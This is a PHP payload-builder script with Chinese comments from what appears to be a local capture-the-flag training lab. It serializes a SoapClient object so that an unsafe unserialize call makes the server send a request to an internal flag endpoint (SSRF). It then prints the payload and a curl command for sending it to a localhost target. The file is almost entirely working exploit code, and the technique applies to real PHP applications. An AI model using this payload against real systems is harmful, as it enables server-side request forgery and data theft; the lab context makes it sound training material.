<?php
// ============================================
// L9 武器工坊：SoapClient 造弹模板（跟 L8 的 build_phar.php 一个用法）
// 用法：填好 TODO -> 命令行跑  D:\deepseek\php709\php.exe build_soap.php
// 原则（L4 铁律）：长度让 PHP 自己数，绝不手搓 s:NN
// ============================================

// TODO 1：location = 请求要打到的地址（想一想：旗在哪台机器的哪个接口？）
$location = 'http://127.0.0.1:8094/flag_l9.php';

// TODO 2：uri = SOAP 命名空间（本靶场随便填个 http://127.0.0.1:8094/ 就行）
$uri = 'http://127.0.0.1:8094/';

// 造弹：new 出来 -> 让 PHP 自己 serialize（长度它数，你只管看图纸）
$client = new SoapClient(null, array(
    'uri'      => $uri,
    'location' => $location,
));
$payload = serialize($client);

echo "=== 弹药出炉 ===\n{$payload}\n\n";
echo "=== 发射方式 ===\n";
echo "浏览器：打开 http://127.0.0.1:8093/ 把上面整行贴进提交框，送进体检\n";
echo "curl   ：curl \"http://127.0.0.1:8093/?d=" . urlencode($payload) . "\"\n";
echo "\n注意：这发弹没有 \\0 字节，URL 直传没问题；但如果你的地址里带 & 这类字符，记得 urlencode。\n";
